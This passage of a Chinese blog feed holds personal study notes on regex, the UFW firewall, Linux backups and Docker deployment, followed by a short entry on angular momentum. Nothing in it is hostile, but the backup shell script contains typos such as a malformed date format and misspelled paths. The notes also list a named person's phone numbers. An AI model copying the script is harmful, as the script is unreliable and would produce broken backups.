匹配[]内的内容，中括号也需要转义，如果不加？这里会贪婪地匹配到最后一个]，？这里限制[只出现了0次或1次</span><br></pre></td></tr></table></figure><p>[Hh]aha 匹配大小写H，组成Haha和haha，<strong>中括号表示其中元素都可</strong>，<strong>小括号配合|使用来匹配词块</strong></p><p>[a-c]* 匹配只有abc连续的单词</p><p>[a-cA-Z]* 可以匹配到大写，如GOOGle只能匹配到GOOG，（需要开启sublime的大小写敏感，win世界中一般对大小写不敏感，linux中敏感）</p><p>&lt;.*&gt; 匹配包括标签中的内容，尖括号无正则意义</p><p>&lt;.*?&gt;只匹配标签</p><p>[a]?lways 匹配lways和always</p><p>[1-3]{3}匹配1-3出现了3次的连续块</p><p>[1-9]{2，}匹配1-9至少出现2次以上</p><p>^(h|x)aha 匹配haha或xaha的段落头</p><hr><p>高级正则使用</p><p>?=字符  正先行断言，先匹配后面的字符，再匹配前面的</p><p>(x|h)aha(?=\swocao)  空格+wocao是先决条件，匹配到了之后再向前匹配x/haha</p><p>?! 负先行断言，先匹配后面的字符，但是不采纳，然后匹配前面的字符，这里!表示非</p><p>(x|h)aha(?!\swocao) 空格+wocao是先决条件，但是不采纳，然后再匹配前面的x/haha</p><p>?&lt;= 正后发断言 ，先匹配后面的字符，前提前面必须跟的是指定字符</p><p>(?&lt;=(x|h)aha\s)(nihao|wo) 匹配nihao或者wo，前面跟的必须是x\haha+空格</p><p>?&lt;!负后发断言 前面跟的不采纳</p><p>(?&lt;!(x|h)aha\s)(nihao|wo) 匹配nihao或者wo，前面如果跟的是x\haha+空格,就不采纳</p><h2 id="day7-防火墙"><a href="#day7-防火墙" class="headerlink" title="day7 防火墙"></a>day7 防火墙</h2><p>安装 UFW<br>sudo apt-get install ufw</p><p>启用 UFW<br>sudo ufw enable</p><p>禁用防火墙<br>ufw disable</p><p>拒绝所有传入并允许所有传出连接<br>sudo ufw default allow outgoing<br>sudo ufw default deny incoming</p><p>允许 SSH 的 22 端口的传入和传出连接<br>sudo ufw allow ssh</p><p>要在特定端口（比如 111）上 deny 流量<br>sudo ufw deny 111</p><p>允许 1725 端口上的 UDP 包<br>sudo ufw allow 1725/udp</p><p>允许从一个 IP 地址连接<br>sudo ufw allow from 123.45.67.89</p><p>允许特定子网的连接<br>sudo ufw allow from 123.45.67.89/24</p><p>允许特定 IP/ 端口的组合<br>sudo ufw allow from 123.45.67.89 to any port 22 proto tcp</p><p>删除一条规则<br>sudo ufw delete allow 80</p><p>编辑 UFW 的配置文件</p><p> 虽然可以通过命令行添加简单的规则，但仍有可能需要添加或删除更高级或特定的规则。 在运行通过终端输入的规则之前，UFW 将运行一个文件 before.rules，它允许回环接口、ping 和 DHCP 等服务。要添加或改变这些规则，编辑 /etc/ufw/before.rules 这个文件。 同一目录中的 before6.rules 文件用于 IPv6 。</p><p>还存在一个 after.rule 和 after6.rule 文件，用于添加在 UFW 运行你通过命令行输入的规则之后需要添加的任何规则。<br>还有一个配置文件位于 /etc/default/ufw。 从此处可以禁用或启用 IPv6，可以设置默认规则，并可以设置 UFW 以管理内置防火墙链。<br><a href="https://blog.csdn.net/qq_42783214/article/details/120867435">https://blog.csdn.net/qq_42783214/article/details/120867435</a></p><h2 id="day8-linux数据备份与磁盘管理"><a href="#day8-linux数据备份与磁盘管理" class="headerlink" title="day8 linux数据备份与磁盘管理"></a>day8 linux数据备份与磁盘管理</h2><h3 id="数据备份"><a href="#数据备份" class="headerlink" title="数据备份"></a>数据备份</h3><p>win <strong>gost</strong>软件（古老），赛门铁克出品，相当于压缩系统盘然后备份，属于硬盘镜像技术</p><p>linux中 <strong>dd</strong>命令实现磁盘备份，前提磁盘足够大</p><h4 id="备份目标"><a href="#备份目标" class="headerlink" title="备份目标"></a>备份目标</h4><p>root</p><p>home</p><p>var/spool/mail 保存邮件目录</p><p>etc/ 系统重要配置文件</p><p>var/xxxx/mysql 根据安装软件进行备份</p><p>httpd https config等，比如装了nginx</p><ul><li>除了标准系统重要文件，你安装的某些服务，也要备份</li></ul><h4 id="磁带机备份"><a href="#磁带机备份" class="headerlink" title="磁带机备份"></a>磁带机备份</h4><p>（重要银行数据）（大公司规模）</p><p>/dev/st0</p><p>倒带（类似于把磁带初始化操作）</p><p>mt -f /dev/st0 rewind</p><p>擦除(会自动覆盖，新产品也不需要擦除)</p><p>mt -f /dev/st0 erase</p><p>出带（拔出来）</p><p>mf -f /dev/st0 offline</p><p>查看磁带的内容</p><p>tar tvf /dev/st0 [磁带上的位置] 空则列出所有信息，磁带没有数据会报错</p><p>备份数据到磁带</p><p>tar cvf /dev/st0 [需要备份的位置]  打不打包都可以</p><p>继续写入数据</p><p>tar rvf /dev/st0 [l需要继续备份数据的位置]</p><p>从磁带中恢复数据到硬盘</p><p>tar xvf /dev/st0 [位置]     先断网，后插入磁带机</p><hr><h4 id="硬盘备份"><a href="#硬盘备份" class="headerlink" title="硬盘备份"></a>硬盘备份</h4><p>完全备份，增量备份（累计增量备份，差异备份）</p><p>每次都完全备份不现实，</p><h5 id="累计增量备份"><a href="#累计增量备份" class="headerlink" title="累计增量备份"></a>累计增量备份</h5><p>先完整备份一次，运行一段时间，比较现在数据与完全备份之间的差异，只备份有差异的数据</p><p>备份</p><p>完整备份|第二天增加的数据|第三天增加的数据……</p><p>恢复</p><p>完整备份+第二天增加的数据+……</p><hr><h5 id="差异备份"><a href="#差异备份" class="headerlink" title="差异备份"></a>差异备份</h5><p>完整的备份1|第二天增加的数据(第一次差异备份)</p><p>完整的备份2|第三天增加的数据（第二次差异备份)</p><p>完整的备份2是相对第一次的备份，把第一次备份当做整体，作为完整的备份2</p><p>后续备份的数据会越来越多</p><hr><h5 id="tar命令备份数据"><a href="#tar命令备份数据" class="headerlink" title="tar命令备份数据"></a>tar命令备份数据</h5><p>tar是完整备份</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">BAKDATE=`date +8y&amp;m%d` #当前日期</span><br><span class="line">DATA3=`date -d &quot;3 days ago&quot; +%y%m%d`#3天前日期</span><br><span class="line">osdata=/diskl </span><br><span class="line">userdata=/disk2</span><br><span class="line">echo &quot;backup OS data starting&quot;</span><br><span class="line">tar -zcvf /$osdata/etc.data/etc_$BAKDATE.tar.gz /etc </span><br><span class="line"><span class="meta">#</span><span class="bash">把/etc目录使用打包成tar.gz文件备份</span></span><br><span class="line">tar -zcvf /$osdata/boot.data/boot_$BAKDATE.tar.gz /boot</span><br><span class="line">tar -zcvf /$osdata/home.data/home_$BAKDATE.tar.gz /home</span><br><span class="line">tar -zcvf /$osdata/root.data/ root_$BAKDATE.tar.gz /root</span><br><span class="line">tar -zcvf /$userdata/usr_data/usrlocal_$BAKDATE.tar.gz /usr/local</span><br><span class="line">tar -zcvf /$userdata/var_WWw/WWw_$BAKDATE.tar.gz /var/WWW</span><br><span class="line">cp -r /$osdata/* /$userdata</span><br><span class="line">cp -r /$userdata/* /$osdata</span><br><span class="line">echo &quot;Backup OS data complete!&quot;</span><br><span class="line"></span><br><span class="line">echo &quot;delete OS data 3 days ago&quot;</span><br><span class="line">rm -rf /$osdata/etc.data/etc_$DATA3.tar.gz </span><br><span class="line">rm -rf /$osdata/boot.data/boot_$DATA3.tar.gz</span><br><span class="line">rm -rf /$osdata/home.data/home_$DATA3.tar.gz</span><br><span class="line">rm -rf /$osdata/ root.data/root_$DATA3.tar.gz</span><br><span class="line">rm -rf /$osdata/usr_data/usr1ocal_$DATA3.tar.gz</span><br><span class="line">rm -rf /$osdata/var_Www/www_$DATA3.tar.gz</span><br><span class="line"></span><br><span class="line">rm -rf /$userdata/etc.datatetc_$DATA3.tar.gz</span><br><span class="line">rm -rf /$userdata/boot.data/boot_$DATA3.tar.gz</span><br><span class="line">rm -rf /$userdata/home.data/home_$DATA3.tar.gz</span><br><span class="line">rm -rf /$userdata/root.data/root_$DATA3.tar.gz</span><br><span class="line">rm -rf /$userdata/usr_data/usrlocal_$DATA3.tar.gz</span><br><span class="line">rm -rf /$userdata/var_www/www_$DATA3.tar.gz</span><br><span class="line">echo &quot;delete cws ok!&quot;</span><br></pre></td></tr></table></figure><h5 id="dump命令备份数据"><a href="#dump命令备份数据" class="headerlink" title="dump命令备份数据"></a>dump命令备份数据</h5><p>yum -y install dump</p><p>yum -y install xfsdump 和dump包一样用，有些系统可以用dump</p><p>dump实现增量备份，tar是完整备份，支持0-9备份，0=完全备份，1~9增量备份</p><p>第一次备份使用0级别进行完全备份</p><p>第二次备份使用1级别，对比0进行增量备份</p><p>第三次使用2级别，对比1级别进行增量备份</p><hr><p>df -h 查看磁盘</p><p>mounted on列显示该filesystem挂载在哪个地方</p><hr><p>xfsdump  -f /root/dump_sda1 /dev/sda1   把root文件夹备份到dev/sda1中</p><p>xfsrestore -f /root/dump_sda1 /root/sda1-test 把root/dump_sda1恢复到root/sda1-test</p><p>xfsdump -1j -f root/boot-z1 dev/sda1   进行增量备份</p><hr><h5 id="dd数据备份"><a href="#dd数据备份" class="headerlink" title="dd数据备份"></a>dd数据备份</h5><p>dd主要用来数据备份，备份时同时进行文件格式转换,备份文件，和备份磁盘不太一样</p><p>dd if=”输入文件” of=“输出文件” bs=“数据块（一次性读取多少个数据）” count=“数量（bs的数量）”</p><p>备份</p><p>dd if=/haha/1.txt  of=/root/1.bak   备份文件（下载bak到本地，修改为txt即可）</p><p>dd if=/dev/sda1 of=/root/boot.bak 备份sda1整个磁盘分区</p><p>恢复</p><p>dd if=/root/boot.bak of=/root/sda1</p><p>整个磁盘备份</p><p>dd if=/dev/sda1 of=/dev/sdb  整盘备份，恢复就是相反</p><p>备份到光盘</p><p>dd if=/dev/cdrom of=/tmp/cd.iso 把光盘中的内容制作成iso文件（光盘镜像）</p><p>mkdir /mnt/cd  建立一个挂载点，用于恢复</p><p>mount -o loop /tmp/cd.iso /mnt/cd  把光盘镜像挂载到/mnt/cd中，类似电脑真插入一张光盘</p><hr><h4 id="远程备份"><a href="#远程备份" class="headerlink" title="远程备份"></a>远程备份</h4><p>rsync</p><p>rsync -av /etc/passwd /tmp/1.txt 把passwd同步到1.txt处</p><p>rsync -av /etc/passwd 192.168.1.1:/tmp/1.txt 远程同步，提示输入对方电脑密码</p><h4 id="磁盘分区管理"><a href="#磁盘分区管理" class="headerlink" title="磁盘分区管理"></a>磁盘分区管理</h4><h2 id="day12-lnmp部署"><a href="#day12-lnmp部署" class="headerlink" title="day12  lnmp部署"></a>day12  lnmp部署</h2><p>张晓杰01067825259    13171073110</p><h2 id="day13-nginx模块和正向代理"><a href="#day13-nginx模块和正向代理" class="headerlink" title="day13 nginx模块和正向代理"></a>day13 nginx模块和正向代理</h2><h2 id="day14-nginx负载均衡"><a href="#day14-nginx负载均衡" class="headerlink" title="day14 nginx负载均衡"></a>day14 nginx负载均衡</h2><h2 id="day25-rsync-镜像"><a href="#day25-rsync-镜像" class="headerlink" title="day25 rsync 镜像"></a>day25 rsync 镜像</h2><p>scp更好？</p><p>scp是secure  copy的简写，用于在Linux下进行远程拷贝文件的命令，和它类似的命令有cp，不过cp只是在本机进行拷贝不能跨服务器，而且scp传输是加密的。可能会稍微影响一下速度。当你服务器硬盘变为只读 read only  system时，用scp可以帮你把文件移出来。另外，scp还非常不占资源，不会提高多少系统负荷，在这一点上，rsync就远远不及它了。虽然  rsync比scp会快一点，但当小文件众多的情况下，rsync会导致硬盘I/O非常高，而scp基本不影响系统正常使用。</p><p><a href="https://blog.csdn.net/phmatthaus/article/details/124674393">https://blog.csdn.net/phmatthaus/article/details/124674393</a></p><h2 id="day30-docker安装"><a href="#day30-docker安装" class="headerlink" title="day30 docker安装"></a>day30 docker安装</h2><p>容器，go语言，开源，任何linux服务器上，虚拟化，只提供服务不需要虚拟整台主机</p><p>只运行nginx，apache服务这种可以只放在容器中，允许开发人员打包自己的docker环境</p><p>docker ce版本</p><p>只需要运行一些服务，没有必要运行整个os</p><hr><h4 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h4><p>镜像（image）：ubuntu镜像,flask3.8(基于debian)等</p><p>容器（container）：镜像运行在容器里，很多时候都是在容器里操作</p><p>仓库（repository）：保存镜像的地方，类似github</p><p>实验环境</p><hr><h4 id="依赖关系"><a href="#依赖关系" class="headerlink" title="依赖关系"></a>依赖关系</h4><p>1.namespace命名空间</p><p>编程语言中的using namespace std这种属于封装，达到隔离效果</p><p>操作系统中，系统资源隔离，如进程，网络，文件系统</p><p>docker使用pid进程隔离，net网络，ipc跨进程通信访问，mnt挂载点，uts隔离内核和版本标识，对这些进行隔离</p><p>2.control group控制组</p><p>用来分配资源</p><p>资源限定，优先级设定，资源计量，资源控制（允许你在什么时候使用多少资源）</p><h3 id="docker部署"><a href="#docker部署" class="headerlink" title="docker部署"></a>docker部署</h3><p>uname -a </p><p>Linux docker-1.4.19.0-18-cloud-amd64  Debian 4.19（2021-9-29）</p><p>ls -l /sys/class/misc ubuntu系统下会有divice-map，debian这里没有就算了</p><p>apt-get install -y docker.io 社区维护版，难在配置，docker安装不难</p><p> source /etc/bash_completion.d/g ubuntu上用到</p><p>docker version</p><p>apt install docker-ce</p><p>systemctl status docker 处于running状态</p><p>docker run ubuntu echo “haha” 测试docker是否可以使用，自动去下载ubuntu，使用ubuntu输出haha，下载的ubuntu在/var/lib/docker/下（在本机上docker的所有东西的位置，其中containers里就是上面ubuntu启动的位置，images存储镜像）</p><p>cat /etc/passwd   /etc/group 已经有docker</p><p>systemctl restart docker</p><p>docker –help</p><p>docker stats 输出docker当前使用io的状态</p><h2 id="day31-docker容器操作"><a href="#day31-docker容器操作" class="headerlink" title="day31 docker容器操作"></a>day31 docker容器操作</h2><h3 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h3><p>docker images 查看当前镜像</p><p>启动删除容器</p><p>docker pull ubuntu 从docker仓库拉取ubuntu的一个镜像，默认使用最后一个ubuntu版本</p><p>docker run  -i -t [镜像] /bin/bash 建立一个交互式镜像 建立一个tty终端，-i使用哪个镜像，让ubunt使用bin/bash这个命令</p><p>docker ps 看到所有正在运行的容器</p><p>docker ps -a  或者-l，列出所有创建的容器</p><p>docker inspect [容器名/容器id]返回容器的配置信息</p><p>使用镜像 docker run –name=ub1 -i -t ubuntu /bin/bash 以ub1的名字来运行刚刚创建的ubuntu</p><p>ctrl+p ctrl+q 无损退出镜像</p><p>docker ps 查看ubuntu还在运行并且name为ub1</p><p>如果出现failed to get d-bus…… 这个是centOS7在docker上的bug，更换6或者8版本</p><p>docker exec -it ub1容器名或容器id /bin/bash 再次进入刚刚的ub1容器，exec这里是执行</p><p>ifconfig发现啥都没有，很干净的ubuntu</p><p>docker start/stop [容器名称] 开关容器，发送信号给容器，等待容器停止，类似关机</p><p>docker kill [容器名]立即直接停止某个容器，类似直接拔电源</p><p>docker rm [容器名或容器id] 彻底从硬盘上删除容器</p><hr><h3 id="守护式容器"><a href="#守护式容器" class="headerlink" title="守护式容器"></a>守护式容器</h3><p>长期运行，没有交互式会话，适合运行应用程序和会话</p><p>docker ps</p><p>docker attach ub1 转入运行中的容器，这里到ub1容器中，exec是执行binbash返回命令行给你</p><p>docker run -d [镜像] [执行命令] 使用后台的方式运行容器</p><p>docker run –name ub2 -d ubuntu /bin/sh -c “while true;do echo hello haha;sleep 1;done” 创建ub2容器并且运行命令，但是当前命令行不会进入到该容器中，不想看到ub2在干嘛，返回唯一id</p><p>docker attach ub2 进入该容器后，不会返回命令行，只会告诉你上面的命令执行怎么样了</p><p>ctrl+c </p><p>docker ps -a 发现退出运行，docker start ub2 再次运行</p><p>查看容器日志</p><p>docker logs [参数] [容器名]</p><p>-f 追踪日志变化，默认false</p><p>-t 返回结果+时间戳</p><p>–tail 结尾返回多少日志，默认false</p><p>docker logs -t ub2</p><p>docker top [容器名] 查看容器中运行的进程，一般一个容器中做一件事情就够了</p><p>docker top ub2 在容器外部以上帝视角查看该容器中运行了哪些东西</p><p>在运行的容器中启动新的进程</p><p>docker exec [-d/i/t] [容器名] [参数]</p><p>docker exec -it ub2 /bin/bash  添加一个新的会话进程</p><h2 id="day32-docker部署web网站"><a href="#day32-docker部署web网站" class="headerlink" title="day32 docker部署web网站"></a>day32 docker部署web网站</h2><h3 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h3><p>docker run -P -it ubuntu /bin/bash 这里-P把所有的端口进行映射，docker里的80端口对应本地80端口</p><p>docker run -p 80 -it ubuntu /bin/bash 只映射80端口</p><p>docker run -p 80 -p 3306 -it ubuntu /bin/bash 只映射80和3306端口</p><p>docker run -p 8080:80 -it ubuntu /bin/bash 把容器内部80端口映射到外部的8080端口</p><p>docker run -p 0.0.0.0:80 -it ubuntu /bin/bash指定ip映射，默认全0映射所有，主机上有可能有多个网卡多个ip，有些ip不想让其作为网站</p><p>docker run -p 0.0.0.0:8080:80 -it ubuntu /bin/bash 指定ip的8080端口映射到容器的80端口</p><hr><h3 id="docker部署nginx"><a href="#docker部署nginx" class="headerlink" title="docker部署nginx"></a>docker部署nginx</h3><p>docker run -p 80 -p 443 –name web1 -it ubuntu /bin/bash 创建并进入web1容器中，此时随机把docker80端口映射到外部某个端口</p><p>apt-get update</p><p>apt-get install nginx</p><p>apt-get nano</p><p>apt-get install vim</p><p>ip addr ifconfig都没有</p><p>cd var/www/html 默认web目录，修改默认index.html文件即可,此时可以访问</p><p>whereis nginx 此时显示相对docker的路径，etc/nginx也是docker内部的</p><p>vi nginx.conf 没改啥，主要看一下conf.d是否被包含，下面使用虚拟主机写法</p><p>可以在docker里安装任何东西，包括ssh服务</p><p>下面把docker当作主机使用，正常配置nginx</p><p>cd conf.d</p><p>vi site1.conf</p><p>写入以下内容</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">server&#123;</span><br><span class="line"><span class="attribute">listen</span> *:<span class="number">80</span>;</span><br><span class="line"><span class="attribute">server_name</span> www.site1.com;</span><br><span class="line"><span class="attribute">location</span> /&#123;</span><br><span class="line">root /var/www/html; 在对应路径处写一个html</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>nginx -t 检查配置是否正确</p><p>nginx -s reload</p><p>nginx -c /etc/nginx/nginx.conf 如果加载失败显示pid问题就使用这条之后重载，-c 选项用于指定 Nginx 使用的配置文件的路径</p><p>ctrl+p ctrl+q</p><p>docker ps查看进程资源，发现端口映射关系，此时外部访问对应端口即可</p><h2 id="day33-docker镜像部署"><a href="#day33-docker镜像部署" class="headerlink" title="day33 docker镜像部署"></a>day33 docker镜像部署</h2><h3 id="部署python后端程序"><a href="#部署python后端程序" class="headerlink" title="部署python后端程序"></a>部署python后端程序</h3><p>在项目文件夹中创建dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用官方的Python 3.8镜像作为基础镜像</span></span><br><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置工作目录为/JudgeSys_app</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /JudgeSys_app</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将当前目录下的所有文件复制到容器里面的/JudgeSys_app目录下，docker exec进入修改</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> . /JudgeSys_app</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装当前目录下python项目所需要的依赖包，pip freeze &gt; requirements.txt</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> pip install --no-cache-dir -r requirements.txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴露容器的5431端口</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">5431</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置环境变量</span></span><br><span class="line"><span class="keyword">ENV</span> NAME World</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行app.py文件</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;python&quot;</span>, <span class="string">&quot;Server.py&quot;</span>]</span></span><br></pre></td></tr></table></figure><p><code>docker build -t judgesys_app:v1.0 . </code>构建一个叫做judgesys_app的镜像，tag标签为v1.0，最后这个点是当前目录，是dockerfile所在的地方，也可以使用参数-f /path/to/Dockerfile指定dockerfile文件位置</p><p>构建安装好之后，<code>docker image ls</code>查看到</p><p><code>docker run -d -p 5431:5431 --name judgesys judgesys_app:v1.0</code></p><p>从judgesys_app:v1.0的镜像实例化一个judgesye名字的容器，-p设置端口将容器的5431（后面那个）端口映射到ubuntu主机的5431端口（前面那个），-d使用后台运行，不会占用终端</p><p>它会返回一个容器的ID。如果您使用docker ps命令并没有看到您的容器，可能有以下几种情况：</p><ul><li>您的容器已经退出了，因为您的Python应用程序运行结束了，或者遇到了错误。您可以使用<code>docker ps -a</code>命令来查看所有的容器，包括已经退出的容器，然后使用<code>docker logs CONTAINER</code>命令来查看容器的日志，以便找出问题的原因。</li><li>您的容器没有正常启动，因为您的镜像有问题，或者您的端口映射有冲突。您可以使用<code>docker ps -a</code>命令来查看所有的容器，包括没有启动的容器，然后使用<code>docker inspect CONTAINER</code>命令来查看容器的详细信息，以便找出问题的原因。</li><li>您的容器在另一个Docker网络中，而您的docker ps命令没有指定网络的参数。您可以使用<code>docker network ls</code>命令来查看所有的Docker网络，然后使用<code>docker ps --network NETWORK</code>命令来查看指定网络中的容器。</li></ul><p>查看时import openai这个包没有被注释掉导致的报错no module named ‘openai’，程序中用不到的包就注释掉即可</p><p>docker stop judgesys 停止容器（意外退出的容器可以使用docker ps -a查看）</p><p>docker rm judgesys 从硬盘删除容器</p><p>docker image  rm judgesys_app:v1.0 删除镜像，重新build（因为之前替换似乎没有替换成功）</p><p>docker run重新运行容器 docker ps （-a）</p><p><code>docker logs judgesys &gt; /home/user/JudgeSys_release/flasklog.txt 2&gt;&amp;1</code> 将judgesys这个容器的标准错误输出重定向到标准输出</p><h3 id="修改容器中某py文件"><a href="#修改容器中某py文件" class="headerlink" title="修改容器中某py文件"></a>修改容器中某py文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">/etc/apt#</span><span class="bash"> cat sources.list 不改直接update也可以，只是慢</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/debian/ buster main contrib non-free</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/debian/ buster-updates main contrib non-free</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/debian/ buster-backports main contrib non-free</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/debian-security buster/updates main contrib non-free</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it c3f279d17e0a容器id /bin/bash</span><br><span class="line">apt-get update #先换上面的源</span><br><span class="line">apt-get install vim/nano</span><br><span class="line"></span><br><span class="line">修改完代码之后</span><br><span class="line">exit #退出容器内部的bash环境</span><br><span class="line">docker restart dockerid #重新运行刚刚exit的容器</span><br><span class="line">docker ps # 查看当前运行docker</span><br><span class="line">docker commit mycontainer myimage:latest #保存为新镜像</span><br><span class="line">docker image ls # 查看现有镜像</span><br></pre></td></tr></table></figure><h3 id="运行docker时挂载volume"><a href="#运行docker时挂载volume" class="headerlink" title="运行docker时挂载volume"></a>运行docker时挂载volume</h3><p>实现docker中某目录与宿主机某目录共享文件（docker中lrzsz无法使用）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker volume create judgesys_log_volume</span><br><span class="line">docker commit judgesys judgesys_app:v2.2.1</span><br><span class="line">docker stop/rm 正在运行的docker容器</span><br><span class="line">docker run -d -p 5431:5431 --name judgesys -v judgesys_log_volume:/JudgeSys_app/uploads judgesys_app:v2.2.1 <span class="comment"># 带-v挂载卷运行容器，这里挂载目录/log是容器根目录下的log文件夹内，这里JudgeSys_app主目录对应dockerfile中的项目目录</span></span><br><span class="line">docker volume ls</span><br><span class="line">docker volume inspect judgesys_log_volume <span class="comment">#查看对应宿主机上的挂载目录路径</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>cabyceogpsji73sske5nvo45mdrkbz4m3qd3iommf3zaaa6izg3j2cqd.onion</p><p>deepmixbf6xqt3m7kagmurdt4v43f2h3doc23h7hrkjlroovyjsvseqd.onion</p><p>DuckDuckGo Hidden Service: <code>http://3g2upl4pq6kufc4m.onion/</code></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 云计算 </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>角动量守恒</title>
      <link href="2023/03/30/%E6%8A%98%E8%85%BE%E5%90%A7/%E8%A7%92%E5%8A%A8%E9%87%8F%E5%AE%88%E6%81%92/"/>
      <url>2023/03/30/%E6%8A%98%E8%85%BE%E5%90%A7/%E8%A7%92%E5%8A%A8%E9%87%8F%E5%AE%88%E6%81%92/</url>
      
        <content type="html"><![CDATA[<h3 id="旋转椅子"><a href="#旋转椅子" class="headerlink" title="旋转椅子"></a>旋转椅子</h3><p><a href="https://www.bilibili.com/video/BV1164y1C7uo">https://www.bilibili.com/video/BV1164y1C7uo</a><br>是不是很神奇？</p><h3 id="平衡自行车的角动量守恒"><a href="#平衡自行车的角动量守恒" class="headerlink" title="平衡自行车的角动量守恒"></a>平衡自行车的角动量守恒</h3><p><a href="https://www.bilibili.com/video/BV1fV411x72a">https://www.bilibili.com/video/BV1fV411x72a</a><br>这个链接看3:00的时候</p><h3 id="绳子绑轮子"><a href="#绳子绑轮子" class="headerlink" title="绳子绑轮子"></a>绳子绑轮子</h3><p><video style="width:700px" src=https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/video/video/%E8%A7%92%E5%8A%A8%E9%87%8F%E5%AE%88%E6%81%92%E5%AE%9A%E7%90%86.mp4> </video></p><h3 id="原理是角动量守恒"><a href="#原理是角动量守恒" class="headerlink" title="原理是角动量守恒"></a>原理是角动量守恒</h3><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/4C1782D040C893A50EDB3279F81939AA.jpg" alt="img"></p><p>第一个链接里面的那个人为啥站到椅子上就自动转了？</p><p>就是因为这个角动量守恒原理</p><p>他一开始手里拿着旋转的轮子，受到合外力为0，然后他站到椅子上，保持和没上椅子一样姿势，然后受到的重力和支持力，合外力还是为0，整个过程合外力都为0</p><p>所以根据上面最后的一个公式，他这个人和底下可以旋转的椅子的底盘，以及手中旋转的轮子组成的这个体系，就是一个守恒的整体</p><p>所以这个体系是有一个角动量状态的，是守恒的，就像后面发你这个视频里面维持一定角度的用绳子挂着的轮子，以及那个up主做的自行车上面一个金属圆盘+自行车，这都是一个守恒的角动量体系</p><p>然后这个体系里面有一部分变了，但是整体必须满足角动量守恒原理，所以为了满足体系的角动量守恒状态，就是初始状态，就必须导致这个体系内的另外的部分有所改变</p><p>对应的3个例子分别是，旋转的底盘带着人一起转，轮子姿势保持不变，以及自行车的不倒</p><h3 id="为什么会这样？"><a href="#为什么会这样？" class="headerlink" title="为什么会这样？"></a>为什么会这样？</h3><p>角动量的刚性<br><a href="https://www.bilibili.com/video/BV1z4411p7Ld">https://www.bilibili.com/video/BV1z4411p7Ld</a></p><h3 id="关于陀螺仪"><a href="#关于陀螺仪" class="headerlink" title="关于陀螺仪"></a>关于陀螺仪</h3><p><a href="https://haokan.baidu.com/v?pd=wisenatural&amp;vid=5815142988505919832">https://haokan.baidu.com/v?pd=wisenatural&amp;vid=5815142988505919832</a></p><p>火箭叔的回答</p><p><a 